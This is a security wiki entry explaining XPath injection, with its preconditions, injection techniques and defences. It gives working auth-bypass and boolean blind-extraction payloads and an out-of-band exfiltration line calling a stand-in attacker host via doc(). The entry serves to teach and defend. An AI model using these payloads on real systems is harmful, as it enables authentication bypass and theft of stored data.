---
title: XPath injection
slug: xpath-injection
---

> **TL;DR:** User input concatenated into XPath query — blind extraction of XML documents via boolean / time-based probes.

## What it is
Apps that store data in XML and query it with XPath sometimes build queries via string concatenation, exactly like classic SQL injection. An attacker injects XPath syntax to alter the predicate, bypass auth (`or 1=1` style), or exfil the whole document one character at a time using boolean oracles. XPath has no notion of users/permissions, so the entire XML document is reachable.

## Preconditions / where it applies
- App uses XPath (1.0 typically) against a server-side XML document — config files, user database, exports, SOAP backends
- Query built by string concatenation rather than parameterised XPath / prepared variables
- Some observable response difference (auth pass/fail, content/no content, timing)

## Technique
1. **Auth-bypass classic** — login query like:
   ```
   //user[username/text()='$u' and password/text()='$p']
   ```
   Inject `u=' or '1'='1` and `p=' or '1'='1`:
   ```
   //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
   ```
   Returns first user — often the admin.
2. **Comment / truncation** — XPath has no inline comment, but `'] | //*[ '` plus `or 1=1` style works; trailing input may be absorbed if app appends `]`.
3. **Boolean blind extraction** — exfil character by character:
   ```
   ' or substring(//user[1]/password,1,1)='a' or '1'='2
   ```
   Iterate position and char; "login OK" or content present == match.
4. **String functions** — XPath 1.0: `string-length()`, `substring()`, `name()`, `local-name()`, `count()`, `position()`. Use to walk the tree:
   - `count(//*)` total nodes
   - `name(//*[position()=N])` Nth node name
   - `//*[name()='secret']/text()` extract
5. **XPath 2.0 / XQuery** if available — much richer (`for`, `doc()`, `unparsed-text()`). `doc('http://attacker/x')` exfils out-of-band (OOB), similar to XXE.
6. **Blind without booleans** — XPath 2.0 `xs:dateTime` + delays, or trigger XSLT processing where `doc()`/`document()` performs DNS lookups (OOB via Burp Collaborator).
7. **NoSQL XPath** — Mongo doesn't use XPath, but MarkLogic, eXist-db, BaseX do; same injection class.

## Detection and defence
- Use parameterised XPath: javax.xml.xpath `setXPathVariableResolver`, .NET `XPathExpression.AddParam`, PHP libxml `prepare`. Treat user input as a variable, never a literal.
- Strip / reject characters not in expected charset (alphanumeric only for usernames).
- Disable XPath 2.0 features `doc()`, `document()`, `unparsed-text()` unless required; block DNS egress from the parser.
- Replace XML+XPath data stores with a real database where feasible.
- Logs: queries returning more rows than expected, queries with quote/parenthesis density above baseline.
- Related: [[sql-injection]], [[ldap-injection]], [[xxe]], [[nosql-injection]].

## References
- [OWASP — XPath injection](https://owasp.org/www-community/attacks/XPATH_Injection) — primitives and examples
- [PortSwigger — XPath injection](https://portswigger.net/kb/issues/00100600_xpath-injection) — quick reference
- [PayloadsAllTheThings — XPath](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection) — payload corpus
